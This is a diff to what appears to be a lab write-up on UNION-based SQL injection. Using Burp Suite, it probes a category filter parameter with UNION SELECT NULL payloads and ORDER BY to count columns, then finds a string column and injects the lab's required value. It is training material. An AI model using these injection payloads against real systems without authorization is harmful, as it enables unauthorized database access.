@@ -11,43 +11,43 @@ The lab will provide a random value that you need to make appear within the quer
 
 ### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
 ```http
-GET /filter?category=Corporate+gifts HTTP/2
+GET /filter?category=Gifts HTTP/2
 ```
 
-### 2. Modified the Request to Determine Column Count
+### 2. Modified the category parameter to Determine Column Count
 
-```http
-GET /filter?category=Accessories'+UNION+SELECT+NULL-- HTTP/2
+```sql
+' UNION SELECT NULL--
+```
 Response: HTTP/2 500 Internal Server Error
-```
 
-```http
-GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL-- HTTP/2
+```sql
+' UNION SELECT NULL,NULL--
+```
 Response: HTTP/2 500 Internal Server Error
-```
 
-```http
-GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
+```sql
+' UNION SELECT NULL,NULL,NULL--
+```
 Response: HTTP/2 200 OK
-```
 
 ![burpsuite response](./misc-images/04-1.png)
 
 Confirmed the number of columns = 3, as response returned HTTP 200.
 
-Alternative approach: Using `ORDER BY` can also determine the column count. An error will be displayed at `ORDER BY 4`.
-
-```http
-GET /filter?category=Accessories'+ORDER+BY+4-- HTTP/2
-Response: HTTP/2 500 Internal Server Error
-```
+Alternative approach: Using `ORDER BY` can also determine the column count. An error will be displayed at `' ORDER BY 4`.
 
 ### 3. Identified Column Accepting String Output
 
-```http
-GET /filter?category=Accessories'+UNION+SELECT+NULL,'a',NULL-- HTTP/2
-Response: HTTP/2 200 OK
+```sql
+' UNION SELECT 'a',NULL,NULL--
 ```
+Response: HTTP/2 500 Internal Server
+
+```sql
+' UNION SELECT NULL,'a',NULL--
+```
+Response: HTTP/2 200 OK
 
 Injected `'a'` is a visible test string and will appear on the page if the injection works.
 
@@ -57,8 +57,8 @@ But, this did not solve the lab. The response included a hint: Make the database
 
 ### 4. Solved the Lab Using the Required Payload
 
-```http
-GET /filter?category=Accessories'+UNION+SELECT+NULL,'xE5jkD',NULL-- HTTP/2
+```sql
+' UNION SELECT NULL,'xE5jkD',NULL--
 ```
 
 ![burpsuite response](./misc-images/04-3.png)
